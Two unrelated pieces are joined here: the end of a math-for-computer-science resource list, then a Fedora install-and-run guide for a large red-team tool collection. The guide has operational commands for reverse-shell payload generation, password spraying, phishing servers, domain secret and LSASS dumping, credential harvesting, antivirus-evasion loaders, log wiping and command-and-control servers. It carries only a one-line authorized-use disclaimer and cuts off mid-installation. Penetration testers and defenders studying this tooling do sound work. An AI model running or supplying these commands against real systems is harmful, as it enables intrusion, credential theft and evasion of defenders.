| **VisuAlgo** | Step-by-step animations of Data Structures & Graph Algorithms | [visualgo.net](https://visualgo.net/) |
| **The Natural Number Game** | Learn formal mathematical proofs interactively using the Lean theorem prover | [adam.math.hhu.de](https://adam.math.hhu.de/) |
| **Desmos / GeoGebra** | 2D/3D graphing calculators for functions, vectors, and calculus | [desmos.com](https://www.desmos.com/) / [geogebra.org](https://www.geogebra.org/) |

### Essential YouTube Channels
* [**3Blue1Brown** (Grant Sanderson)](https://www.youtube.com/@3blue1brown) — Unmatched visual intuition for Linear Algebra, Calculus, Differential Equations, Neural Networks, and Information Theory.
* [**MIT OpenCourseWare**](https://www.youtube.com/@mitocw) — Full semester courses for 6.042J (CS Math), 18.06 (Linear Algebra), 6.006 (Algorithms), and 18.404J (Theory of Computation).
* [**StatQuest with Josh Starmer**](https://www.youtube.com/@statquest) — Crystal-clear explanations of Statistics, Probability, and Machine Learning math.
* [**TrevTutor**](https://www.youtube.com/@Trevtutor) — Bite-sized tutorials on Discrete Math, Graph Theory, Combinatorics, and Abstract Algebra.
* [**Numberphile**](https://www.youtube.com/@numberphile) & [**Computerphile**](https://www.youtube.com/@Computerphile) — Engaging explorations of number theory, cryptography, and computability.

### Mathematical Software & Python Libraries
* **`SymPy`** (`pip install sympy`): Symbolic mathematics in Python — solves algebraic equations, computes exact symbolic derivatives/integrals, simplifies Boolean logic, and outputs LaTeX.
* **`NumPy` & `SciPy`** (`pip install numpy scipy`): High-performance matrix/tensor computing, linear algebra (`numpy.linalg`), FFT, and numerical optimization.
* **`NetworkX`** (`pip install networkx`): Creation, manipulation, and study of complex graphs and networks in Python.
* **`Z3 Theorem Prover`** (`pip install z3-solver`): Microsoft Research's SMT solver — essential for formal verification, program analysis, and solving logic/constraint puzzles.
* **`SageMath`** ([sagemath.org](https://www.sagemath.org/)): Open-source mathematics software system built on Python, widely used in number theory and cryptography research.
* **`LaTeX` / `KaTeX`** ([Overleaf Learn LaTeX in 30 Minutes](https://www.overleaf.com/learn/latex/Learn_LaTeX_in_30_minutes)): The standard typesetting system for CS papers, homework, and documentation.

### How to Read & Write Mathematical Proofs
1. **Treat Definitions like Data Types:** Before trying to prove a theorem about a "bipartite graph" or "injective function", write down the exact formal definition of both terms.
2. **Test with Small Concrete Examples First:** Just like debugging code with small test cases ($n = 0, 1, 2, 3$), plug small numbers or tiny graphs into a theorem to see *why* it holds before writing an abstract proof.
3. **Work Backwards on Scratch Paper, Write Forwards in the Final Proof:** Start from what you want to show and simplify it until it connects to your assumptions—then write the proof in forward logical order.
4. **Translate Math Notation into Code Loops:**
   * $\sum_{i=1}^n a_i$ is a `for` loop accumulating a sum (`total += a[i]`).
   * $\prod_{i=1}^n a_i$ is a `for` loop accumulating a product (`prod *= a[i]`).
   * Mathematical induction is a recursive function: the **Base Case** is `if n == 0: return True`, and the **Inductive Step** is `return check(n) and prove(n - 1)`.

---

## License

MIT License — Free to use, fork, share, and adapt for students and educators everywhere.


---


# RedTeam-Tools: Native Fedora Linux Installation & Usage Guide

This guide converts all Linux-compatible tools from the **A-poc/RedTeam-Tools** repository into native **Fedora Linux** commands using `dnf`, `go install`, `cargo`, `pipx` / Python `venv` (to respect Fedora's PEP 668 externally-managed Python environment), `gem`, and `git`.

> **Disclaimer:** These tools are for authorized security assessments, penetration testing labs, and educational use only.

---

## Step 1: Fedora Prerequisites & Base Environment Setup

Run this first to install Fedora build tools, language runtimes (Go, Rust, Python, Ruby, .NET, PowerShell, MinGW cross-compiler), and configure your `$PATH` and `/opt/redteam` workspace:

```bash
# 1. Update Fedora and install C/C++ development groups
sudo dnf update -y
sudo dnf group install -y development-tools c-development

# 2. Install core runtimes, libraries, and native security packages available in Fedora repos
sudo dnf install -y \
  git curl wget jq tar p7zip p7zip-plugins unzip \
  golang rust cargo \
  python3 python3-pip python3-devel python3-virtualenv pipx \
  ruby ruby-devel rubygems \
  openssl-devel libffi-devel libpcap-devel sqlite-devel \
  SDL2-devel fftw-devel \
  mingw64-gcc mingw64-gcc-c++ mingw32-gcc osslsigncode \
  cmake gcc-c++ make automake autoconf \
  samba-client samba-common-tools openldap-clients perl-interpreter \
  nmap socat wireshark-cli tcpdump bind-utils chromium podman \
  gobuster dnsrecon hydra john hashcat

# 3. Create a central directory for git-cloned tools
sudo mkdir -p /opt/redteam
sudo chown -R "$USER:$USER" /opt/redteam

# 4. Configure PATH for Go, Cargo, and Pipx binaries
pipx ensurepath
export PATH="$HOME/go/bin:$HOME/.cargo/bin:$HOME/.local/bin:$PATH"
grep -qxF 'export PATH="$HOME/go/bin:$HOME/.cargo/bin:$HOME/.local/bin:$PATH"' ~/.bashrc || \
  echo 'export PATH="$HOME/go/bin:$HOME/.cargo/bin:$HOME/.local/bin:$PATH"' >> ~/.bashrc
```

### Optional: Install PowerShell Core (`pwsh`) on Fedora
Many PowerShell-based offensive/recon tools (`PowerZure`, `Invoke-Obfuscation`, `PowerSploit`) can run directly on Fedora through `pwsh`:

```bash
sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc
curl -sSL https://packages.microsoft.com/config/rhel/9/prod.repo | sudo tee /etc/yum.repos.d/microsoft.repo
sudo dnf install -y powershell
```

---

## Step 2: Fast Batch Installers (By Ecosystem)

If you want to bulk-install the CLI tools by language before looking at individual usage commands:

```bash
# --- Bulk Install Go Tools ---
go install -v github.com/PentestPad/subzy@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/OJ/gobuster/v3@latest
go install -v github.com/0xsha/CloudBrute@latest
go install -v github.com/zhzyker/dismap/cmd/dismap@latest
go install -v github.com/j3ssie/metabigor@latest
go install -v github.com/michenriksen/gitrob@latest
go install -v github.com/sensepost/gowitness@latest
go install -v github.com/ropnop/kerbrute@latest
go install -v github.com/tomnomnom/httprobe@latest
go install -v github.com/ericchiang/pup@latest
go install -v goshs.de/goshs/v2@latest

# --- Bulk Install Python CLI Tools via pipx ---
pipx install smtp-user-enum
pipx install dnsrecon
pipx install shodan
pipx install aort
pipx install git+https://github.com/cddmp/enum4linux-ng.git
pipx install git+https://github.com/blacklanternsecurity/TREVORspray.git
pipx install impacket
pipx install dploot
pipx install adidnsdump
pipx install git+https://github.com/Pennyw0rth/NetExec.git
pipx install coercer
pipx install bloodhound
pipx install slowloris

# --- Bulk Install Rust Tools ---
cargo install feroxbuster

# --- Bulk Install Ruby Gems ---
gem install winrm winrm-fs stringio logger fileutils evil-winrm
```

---

## Step 3: Tool-by-Tool Fedora Install & Run Commands

### 1. Reconnaissance

#### SpiderFoot
* **Install:**
  ```bash
  git clone https://github.com/smicallef/spiderfoot.git /opt/redteam/spiderfoot
  cd /opt/redteam/spiderfoot
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  /opt/redteam/spiderfoot/.venv/bin/python /opt/redteam/spiderfoot/sf.py -l 127.0.0.1:5001
  ```

#### reconFTW
* **Install:**
  ```bash
  git clone https://github.com/six2dez/reconftw.git /opt/redteam/reconftw
  cd /opt/redteam/reconftw && ./install.sh
  ```
* **Run:**
  ```bash
  cd /opt/redteam/reconftw
  ./reconftw.sh -d target.com -r          # Single domain recon
  ./reconftw.sh -d target.com -p          # Passive recon only
  ```

#### subzy
* **Install:**
  ```bash
  go install -v github.com/PentestPad/subzy@latest
  ```
* **Run:**
  ```bash
  subzy run --target test.example.com
  subzy run --targets subdomains.txt
  ```

#### smtp-user-enum
* **Install:**
  ```bash
  pipx install smtp-user-enum
  ```
* **Run:**
  ```bash
  smtp-user-enum -M VRFY -U users.txt -t 192.168.1.10
  ```

#### crt.sh -> httprobe -> EyeWitness
* **Install:**
  ```bash
  go install github.com/ericchiang/pup@latest
  go install github.com/tomnomnom/httprobe@latest
  git clone https://github.com/RedSiege/EyeWitness.git /opt/redteam/EyeWitness
  cd /opt/redteam/EyeWitness/Python/setup && sudo ./setup.sh
  ```
* **Run:**
  ```bash
  domain=example.com; rand=$RANDOM
  curl -fsSL "https://crt.sh/?q=${domain}" | pup 'td text{}' | grep "${domain}" | sort -u | httprobe > /tmp/enum_tmp_${rand}.txt
  python3 /opt/redteam/EyeWitness/Python/EyeWitness.py -f /tmp/enum_tmp_${rand}.txt --web
  ```

#### nuclei
* **Install:**
  ```bash
  go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
  nuclei -update-templates
  ```
* **Run:**
  ```bash
  nuclei -u https://example.com
  cat domains.txt | nuclei
  ```

#### certSniff
* **Install:**
  ```bash
  git clone https://github.com/A-poc/certSniff.git /opt/redteam/certSniff
  cd /opt/redteam/certSniff
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  /opt/redteam/certSniff/.venv/bin/python /opt/redteam/certSniff/certSniff.py -f keywords.txt
  ```

#### gobuster
* **Install:**
  ```bash
  sudo dnf install -y gobuster
  ```
* **Run:**
  ```bash
  gobuster dir -u "https://example.com" -w /path/to/wordlist.txt -b 301,401,403,404,500 -t 20
  ```

#### feroxbuster
* **Install:**
  ```bash
  curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash -s "$HOME/.local/bin"
  # Or compile via Rust: cargo install feroxbuster
  ```
* **Run:**
  ```bash
  feroxbuster -u http://127.0.0.1 -x pdf,js,html,php,txt,json,docx
  ```

#### CloudBrute
* **Install:**
  ```bash
  go install github.com/0xsha/CloudBrute@latest
  ```
* **Run:**
  ```bash
  CloudBrute -d target.com -k target -m storage -t 80 -T 10 -w ./data/storage_small.txt
  ```

#### dnsrecon
* **Install:**
  ```bash
  sudo dnf install -y dnsrecon
  ```
* **Run:**
  ```bash
  dnsrecon -d example.com
  ```

#### Shodan CLI
* **Install:**
  ```bash
  pipx install shodan
  ```
* **Run:**
  ```bash
  shodan init <YOUR_API_KEY>
  shodan search org:"Target Corp"
  ```

#### AORT
* **Install:**
  ```bash
  pipx install aort
  ```
* **Run:**
  ```bash
  aort -d example.com
  ```

#### spoofcheck
* **Install:**
  ```bash
  git clone https://github.com/BishopFox/spoofcheck.git /opt/redteam/spoofcheck
  cd /opt/redteam/spoofcheck
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  /opt/redteam/spoofcheck/.venv/bin/python /opt/redteam/spoofcheck/spoofcheck.py example.com
  ```

#### AWSBucketDump
* **Install:**
  ```bash
  git clone https://github.com/jordanpotti/AWSBucketDump.git /opt/redteam/AWSBucketDump
  cd /opt/redteam/AWSBucketDump
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  /opt/redteam/AWSBucketDump/.venv/bin/python /opt/redteam/AWSBucketDump/AWSBucketDump.py -l BucketNames.txt -g keywords.txt -D -m 500000 -d 1
  ```

#### GitHarvester
* **Install:**
  ```bash
  git clone https://github.com/metac0rtex/GitHarvester.git /opt/redteam/GitHarvester
  ```
* **Run:**
  ```bash
  python3 /opt/redteam/GitHarvester/githarvester.py -h
  ```

#### truffleHog
* **Install:**
  ```bash
  curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b "$HOME/.local/bin"
  ```
* **Run:**
  ```bash
  trufflehog git https://github.com/trufflesecurity/test_keys
  ```

#### Dismap
* **Install:**
  ```bash
  go install github.com/zhzyker/dismap/cmd/dismap@latest
  ```
* **Run:**
  ```bash
  dismap -i 192.168.1.1/24 -o result.txt -j result.json
  ```

#### enum4linux & enum4linux-ng
* **Install:**
  ```bash
  sudo dnf install -y samba-client samba-common-tools openldap-clients perl-interpreter
  git clone https://github.com/CiscoCXSecurity/enum4linux.git /opt/redteam/enum4linux
  pipx install git+https://github.com/cddmp/enum4linux-ng.git
  ```
* **Run:**
  ```bash
  /opt/redteam/enum4linux/enum4linux.pl -a 192.168.2.55
  enum4linux-ng -A 192.168.2.55
  ```

#### skanuvaty
* **Install:**
  ```bash
  git clone https://github.com/Esc4iCEscEsc/skanuvaty.git /opt/redteam/skanuvaty
  cd /opt/redteam/skanuvaty && cargo build --release
  cp target/release/skanuvaty "$HOME/.local/bin/"
  ```
* **Run:**
  ```bash
  skanuvaty --target example.com --concurrency 16 --subdomains-file subdomains.txt
  ```

#### Metabigor
* **Install:**
  ```bash
  go install github.com/j3ssie/metabigor@latest
  ```
* **Run:**
  ```bash
  echo "company" | metabigor net --org -o /tmp/result.txt
  echo "example.com" | metabigor related -s 'whois'
  ```

#### Gitrob
* **Install:**
  ```bash
  go install github.com/michenriksen/gitrob@latest
  ```
* **Run:**
  ```bash
  export GITROB_ACCESS_TOKEN="your_github_token"
  gitrob acmecorp
  ```

#### gowitness
* **Install:**
  ```bash
  sudo dnf install -y chromium
  go install github.com/sensepost/gowitness@latest
  ```
* **Run:**
  ```bash
  gowitness scan single --url https://www.google.com/
  gowitness scan cidr --cidr 192.168.0.0/24 --threads 20
  gowitness report server
  ```

---

### 2. Resource Development

#### remoteinjector
* **Install:**
  ```bash
  git clone https://github.com/JohnWoodman/remoteinjector.git /opt/redteam/remoteinjector
  ```
* **Run:**
  ```bash
  python3 /opt/redteam/remoteinjector/remoteinjector.py -w https://example.com/template.dotm example.docx
  ```

#### Chimera
* **Install:**
  ```bash
  sudo dnf install -y sed vim-common glibc-common curl jq perl gawk grep coreutils git
  git clone https://github.com/tokyoneon/chimera.git /opt/redteam/chimera
  chmod +x /opt/redteam/chimera/chimera.sh
  ```
* **Run:**
  ```bash
  /opt/redteam/chimera/chimera.sh --help
  ```

#### msfvenom (Metasploit Framework)
* **Install:**
  ```bash
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
  chmod 755 /tmp/msfinstall && sudo /tmp/msfinstall
  ```
* **Run:**
  ```bash
  msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
  msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
  ```

#### Freeze
* **Install:**
  ```bash
  sudo dnf install -y golang mingw64-gcc
  git clone https://github.com/optiv/Freeze.git /opt/redteam/Freeze
  cd /opt/redteam/Freeze && go build Freeze.go
  ```
* **Run:**
  ```bash
  /opt/redteam/Freeze/Freeze -I payload.bin -O loader.exe -encrypt -sandbox
  ```

#### WordSteal
* **Install:**
  ```bash
  git clone https://github.com/0x09AL/WordSteal.git /opt/redteam/WordSteal
  ```
* **Run:**
  ```bash
  python3 /opt/redteam/WordSteal/main.py 127.0.0.1 test.jpg 0
  ```

---

### 3. Initial Access

#### CredMaster
* **Install:**
  ```bash
  git clone https://github.com/knavesec/CredMaster.git /opt/redteam/CredMaster
  cd /opt/redteam/CredMaster
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  /opt/redteam/CredMaster/.venv/bin/python /opt/redteam/CredMaster/credmaster.py --config config.json
  ```

#### TREVORspray
* **Install:**
  ```bash
  pipx install git+https://github.com/blacklanternsecurity/TREVORspray.git
  ```
* **Run:**
  ```bash
  trevorspray --recon example.com
  trevorspray -u emails.txt -p 'Welcome123' --url https://login.windows.net/<tenant-id>/oauth2/token
  ```

#### evilqr
* **Install:**
  ```bash
  git clone https://github.com/kgretzky/evilqr.git /opt/redteam/evilqr
  cd /opt/redteam/evilqr/server && go build -o evilqr-server .
  ```
* **Run:**
  ```bash
  /opt/redteam/evilqr/server/evilqr-server
  ```

#### CUPP
* **Install:**
  ```bash
  git clone https://github.com/Mebus/cupp.git /opt/redteam/cupp
  ```
* **Run:**
  ```bash
  python3 /opt/redteam/cupp/cupp.py -i
  ```

#### EvilGoPhish
* **Install:**
  ```bash
  git clone https://github.com/fin3ss3g0d/evilgophish.git /opt/redteam/evilgophish
  ```
* **Run:**
  ```bash
  cd /opt/redteam/evilgophish
  ./setup.sh example.com "accounts myaccount" false https://redirect.com/ true user_id false
  ```

#### The Social-Engineer Toolkit (SET)
* **Install:**
  ```bash
  git clone https://github.com/trustedsec/social-engineer-toolkit.git /opt/redteam/setoolkit
  cd /opt/redteam/setoolkit
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  sudo /opt/redteam/setoolkit/.venv/bin/python /opt/redteam/setoolkit/setoolkit
  ```

#### Hydra
* **Install:**
  ```bash
  sudo dnf install -y hydra
  ```
* **Run:**
  ```bash
  hydra -L users.txt -P pass.txt 192.168.1.10 ssh
  ```

#### SquarePhish
* **Install:**
  ```bash
  git clone https://github.com/secureworks/squarephish.git /opt/redteam/squarephish
  cd /opt/redteam/squarephish
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  /opt/redteam/squarephish/.venv/bin/python /opt/redteam/squarephish/squish.py server -c settings.config
  /opt/redteam/squarephish/.venv/bin/python /opt/redteam/squarephish/squish.py email -e user@example.com
  ```

---

### 4. Execution

#### Responder
* **Install:**
  ```bash
  git clone https://github.com/lgandx/Responder.git /opt/redteam/Responder
  ```
* **Run:**
  ```bash
  sudo python3 /opt/redteam/Responder/Responder.py -I eth0 -wrf
  ```

#### secretsdump (Impacket)
* **Install:**
  ```bash
  pipx install impacket
  ```
* **Run:**
  ```bash
  secretsdump.py -ntds ntds.dit -system systemhive LOCAL
  secretsdump.py -dc-ip 10.10.10.30 DOMAIN.LOCAL/user:password@10.10.10.30
  ```

#### evil-winrm
* **Install:**
  ```bash
  sudo dnf install -y ruby ruby-devel rubygems gcc make openssl-devel
  gem install winrm winrm-fs stringio logger fileutils evil-winrm
  ```
* **Run:**
  ```bash
  evil-winrm -i 192.168.1.100 -u Administrator -p 'Pass123!' -s '/opt/redteam/ps1/' -e '/opt/redteam/exe/'
  ```

#### Donut
* **Install:**
  ```bash
  git clone https://github.com/TheWover/donut.git /opt/redteam/donut
  cd /opt/redteam/donut && make
  ```
* **Run:**
  ```bash
  /opt/redteam/donut/donut -i payload.exe -o loader.bin
  ```

#### macro_pack
* **Install:**
  ```bash
  git clone https://github.com/sevagas/macro_pack.git /opt/redteam/macro_pack
  cd /opt/redteam/macro_pack
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  /opt/redteam/macro_pack/.venv/bin/python /opt/redteam/macro_pack/macro_pack.py --help
  ```

#### demiguise
* **Install:**
  ```bash
  git clone https://github.com/nccgroup/demiguise.git /opt/redteam/demiguise
  ```
* **Run:**
  ```bash
  python3 /opt/redteam/demiguise/demiguise.py -k hello -c "notepad.exe" -p Outlook.Application -o test.hta
  ```

#### PowerZure (via PowerShell Core on Fedora)
* **Install:**
  ```bash
  git clone https://github.com/hausec/PowerZure.git /opt/redteam/PowerZure
  pwsh -Command "Install-Module -Name Az -Scope CurrentUser -Force"
  ```
* **Run:**
  ```bash
  pwsh -Command "Import-Module /opt/redteam/PowerZure/PowerZure.psd1; Get-AzureTarget"
  ```

---

### 5. Persistence

#### Impacket Suite
* **Install:**
  ```bash
  pipx install impacket
  ```
* **Run:**
  ```bash
  netview.py domain/user:password -target 192.168.10.2
  mssqlinstance.py 192.168.1.2
  GetADUsers.py domain/user:password@192.168.10.2
  ```

#### Empire (via Podman on Fedora)
* **Install:**
  ```bash
  sudo dnf install -y podman
  podman pull bcsecurity/empire:latest
  ```
* **Run:**
  ```bash
  podman run -it -p 1337:1337 -p 80:80 -p 443:443 bcsecurity/empire:latest server
  ```

#### ligolo-ng
* **Install:**
  ```bash
  git clone https://github.com/nicocha30/ligolo-ng.git /opt/redteam/ligolo-ng
  cd /opt/redteam/ligolo-ng
  go build -o proxy cmd/proxy/main.go
  go build -o agent cmd/agent/main.go
  GOOS=windows go build -o agent.exe cmd/agent/main.go
  ```
* **Run:**
  ```bash
  # Configure TUN interface on Fedora host
  sudo ip tuntap add user "$USER" mode tun ligolo
  sudo ip link set ligolo up

  # Start Proxy Server
  /opt/redteam/ligolo-ng/proxy -selfcert

  # On target host
  ./agent -connect <YOUR_IP>:11601 -ignore-cert
  ```

---

### 6. Privilege Escalation

#### LinPEAS
* **Install:**
  ```bash
  mkdir -p /opt/redteam/peass
  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /opt/redteam/peass/linpeas.sh
  chmod +x /opt/redteam/peass/linpeas.sh
  ```
* **Run:**
  ```bash
  /opt/redteam/peass/linpeas.sh
  ```

#### linux-smart-enumeration (LSE)
* **Install:**
  ```bash
  curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o /opt/redteam/peass/lse.sh
  chmod 700 /opt/redteam/peass/lse.sh
  ```
* **Run:**
  ```bash
  /opt/redteam/peass/lse.sh -l 1
  ```

#### BeRoot
* **Install:**
  ```bash
  git clone https://github.com/AlessandroZ/BeRoot.git /opt/redteam/BeRoot
  ```
* **Run:**
  ```bash
  python3 /opt/redteam/BeRoot/Linux/beroot.py
  ```

---

### 7. Defense Evasion

#### Invoke-Obfuscation (via `pwsh`)
* **Install:**
  ```bash
  git clone https://github.com/danielbohannon/Invoke-Obfuscation.git /opt/redteam/Invoke-Obfuscation
  ```
* **Run:**
  ```bash
  pwsh -Command "Import-Module /opt/redteam/Invoke-Obfuscation/Invoke-Obfuscation.psd1; Invoke-Obfuscation"
  ```

#### Mangle
* **Install:**
  ```bash
  git clone https://github.com/optiv/Mangle.git /opt/redteam/Mangle
  cd /opt/redteam/Mangle
  go mod init mangle 2>/dev/null || true
  go get github.com/Binject/debug/pe
  go build Mangle.go
  ```
* **Run:**
  ```bash
  /opt/redteam/Mangle/Mangle -I orig.exe -O new.exe -M -S 15
  ```

#### ScareCrow
* **Install:**
  ```bash
  sudo dnf install -y openssl osslsigncode mingw64-gcc
  git clone https://github.com/optiv/ScareCrow.git /opt/redteam/ScareCrow
  cd /opt/redteam/ScareCrow && go build ScareCrow.go
  ```
* **Run:**
  ```bash
  /opt/redteam/ScareCrow/ScareCrow -I payload.bin -Loader binary -domain microsoft.com
  ```

#### moonwalk
* **Install:**
  ```bash
  curl -L https://github.com/mufeedvh/moonwalk/releases/download/v1.0.0/moonwalk_linux -o "$HOME/.local/bin/moonwalk"
  chmod +x "$HOME/.local/bin/moonwalk"
  ```
* **Run:**
  ```bash
  moonwalk start
  moonwalk finish
  ```

---

### 8. Credential Access

#### LaZagne
* **Install:**
  ```bash
  git clone https://github.com/AlessandroZ/LaZagne.git /opt/redteam/LaZagne
  cd /opt/redteam/LaZagne
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  /opt/redteam/LaZagne/.venv/bin/python /opt/redteam/LaZagne/Linux/laZagne.py all
  ```

#### hashcat
* **Install:**
  ```bash
  sudo dnf install -y hashcat
  ```
* **Run:**
  ```bash
  hashcat -m 1000 hashes.txt wordlist.txt
  ```

#### John the Ripper
* **Install:**
  ```bash
  sudo dnf install -y john
  ```
* **Run:**
  ```bash
  john --wordlist=wordlist.txt hashes.txt
  ```

#### nanodump (Cross-Compile on Fedora with MinGW)
* **Install:**
  ```bash
  sudo dnf install -y mingw64-gcc make
  git clone https://github.com/fortra/nanodump.git /opt/redteam/nanodump
  cd /opt/redteam/nanodump && make -f Makefile.mingw
  ```
* **Run (Output binary on Windows target):**
  ```powershell
  .\nanodump.x64.exe --write C:\Windows\Temp\lsass.dmp
  ```

#### eviltree
* **Install:**
  ```bash
  git clone https://github.com/t3l3machus/eviltree.git /opt/redteam/eviltree
  cd /opt/redteam/eviltree
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  /opt/redteam/eviltree/.venv/bin/python /opt/redteam/eviltree/eviltree.py -r /var/www -k passw,admin,account,login,user -v
  ```

#### SeeYouCM-Thief
* **Install:**
  ```bash
  git clone https://github.com/trustedsec/SeeYouCM-Thief.git /opt/redteam/SeeYouCM-Thief
  cd /opt/redteam/SeeYouCM-Thief
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  /opt/redteam/SeeYouCM-Thief/.venv/bin/python /opt/redteam/SeeYouCM-Thief/thief.py -H <CUCM_SERVER> --userenum
  ```

#### dploot
* **Install:**
  ```bash
  pipx install dploot
  ```
* **Run:**
  ```bash
  dploot machinecertificates -d domain.local -u Administrator -p 'Password!123' 192.168.56.14 -quiet
  dploot backupkey -d domain.local -u Administrator -p 'Password!123' 192.168.56.112 -quiet
  ```

---

### 9. Discovery

#### PCredz
* **Install:**
  ```bash
  sudo dnf install -y libpcap-devel python3-devel gcc
  git clone https://github.com/lgandx/PCredz.git /opt/redteam/PCredz
  cd /opt/redteam/PCredz
  python3 -m venv .venv && .venv/bin/pip install Cython python-libpcap
  ```
* **Run:**
  ```bash
  # Parse PCAP directory
  /opt/redteam/PCredz/.venv/bin/python /opt/redteam/PCredz/Pcredz -d /tmp/pcaps/
  # Live interface capture
  sudo /opt/redteam/PCredz/.venv/bin/python /opt/redteam/PCredz/Pcredz -i eth0 -v
  ```

#### adidnsdump
* **Install:**
  ```bash
  pipx install adidnsdump
  ```
* **Run:**
  ```bash
  adidnsdump -u domain\\testuser dc.domain.local -r
  ```

#### kerbrute
* **Install:**
  ```bash
  go install github.com/ropnop/kerbrute@latest
  ```
* **Run:**
  ```bash
  kerbrute userenum -d lab.domain.com usernames.txt
  kerbrute passwordspray -d lab.domain.com domain_users.txt Password123
  ```

#### scavenger
* **Install:**
  ```bash
  git clone https://github.com/SpiderLabs/scavenger.git /opt/redteam/scavenger
  ```
* **Run:**
  ```bash
  python3 /opt/redteam/scavenger/scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local
  ```

---

### 10. Lateral Movement

#### CrackMapExec / NetExec (`nxc`)
* **Install:**
  ```bash
  pipx install git+https://github.com/Pennyw0rth/NetExec.git
  ```
* **Run:**
  ```bash
  nxc smb 192.168.1.10 -d domain.local -u users.txt -p passwords.txt
  ```

#### PowerLessShell
* **Install:**
  ```bash
  git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git /opt/redteam/PowerLessShell
  ```
* **Run:**
  ```bash
  python3 /opt/redteam/PowerLessShell/PowerLessShell.py -type powershell -source script.ps1 -output payload.csproj
  ```

#### Forwarding Ports (`socat`)
* **Install:**
  ```bash
  sudo dnf install -y socat
  ```
* **Run:**
  ```bash
  socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
  ```

#### ADFSpoof
* **Install:**
  ```bash
  git clone https://github.com/mandiant/ADFSpoof.git /opt/redteam/ADFSpoof
  cd /opt/redteam/ADFSpoof
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  /opt/redteam/ADFSpoof/.venv/bin/python /opt/redteam/ADFSpoof/ADFSpoof.py -b EncryptedPfx.bin DKMkey.bin dump
  ```

#### Coercer
* **Install:**
  ```bash
  pipx install coercer
  ```
* **Run:**
  ```bash
  Coercer scan -t 192.168.1.1 -u 'username' -p 'password' -d test.local -v
  Coercer coerce -l 192.168.1.2 -t 192.168.1.1 -u 'username' -p 'password' -d test.local -v
  ```

---

### 11. Collection

#### BloodHound (Python Ingestor + BloodHound CE)
* **Install:**
  ```bash
  pipx install bloodhound
  ```
* **Run:**
  ```bash
  bloodhound-python -u username -p 'Password123' -d domain.local -ns 192.168.1.10 -c all
  ```

#### linWinPwn
* **Install:**
  ```bash
  git clone https://github.com/lefayjey/linWinPwn.git /opt/redteam/linWinPwn
  chmod +x /opt/redteam/linWinPwn/linWinPwn.sh
  ```
* **Run:**
  ```bash
  /opt/redteam/linWinPwn/linWinPwn.sh -t <DC_IP> -d <AD_DOMAIN> -u <USER> -p <PASS>
  ```

---

### 12. Command and Control (C2)

#### Havoc
* **Install:**
  ```bash
  sudo dnf install -y git gcc gcc-c++ make cmake golang python3-devel \
    qt5-qtbase-devel qt5-qtwebsockets-devel spdlog-devel libuv-devel \
    mesa-libGL-devel mingw64-gcc mingw64-gcc-c++ nasm
  git clone https://github.com/HavocFramework/Havoc.git /opt/redteam/Havoc
  cd /opt/redteam/Havoc/teamserver && make ts-build
  cd /opt/redteam/Havoc/client && make client-build
  ```
* **Run:**
  ```bash
  # Start Teamserver
  cd /opt/redteam/Havoc/teamserver && sudo ./havoc server --profile ./profiles/havoc.yaotl -v --debug
  # Start Client GUI
  cd /opt/redteam/Havoc/client && ./Havoc
  ```

#### Covenant
* **Install (via Podman on Fedora):**
  ```bash
  git clone --recurse-submodules https://github.com/cobbr/Covenant /opt/redteam/Covenant
  cd /opt/redteam/Covenant/Covenant && podman build -t covenant .
  ```
* **Run:**
  ```bash
  podman run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant covenant
  # Navigate to https://127.0.0.1:7443
  ```

#### Merlin
* **Install:**
  ```bash
  sudo dnf install -y p7zip p7zip-plugins
  mkdir -p /opt/redteam/merlin && cd /opt/redteam/merlin
  wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
  7za x -pmerlin merlinServer-Linux-x64.7z
  ```
* **Run:**
  ```bash
  sudo /opt/redteam/merlin/merlinServer-Linux-x64
  ```

#### Metasploit Framework
* **Install:**
  ```bash
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
  chmod 755 /tmp/msfinstall && sudo /tmp/msfinstall
  ```
* **Run:**
  ```bash
  msfconsole
  ```

#### NimPlant
* **Install:**
  ```bash
  sudo dnf install -y mingw64-gcc
  curl https://nim-lang.org/choosenim/init.sh -sSf | sh
  export PATH="$HOME/.nimble/bin:$PATH"
  git clone https://github.com/chvancooten/NimPlant.git /opt/redteam/NimPlant
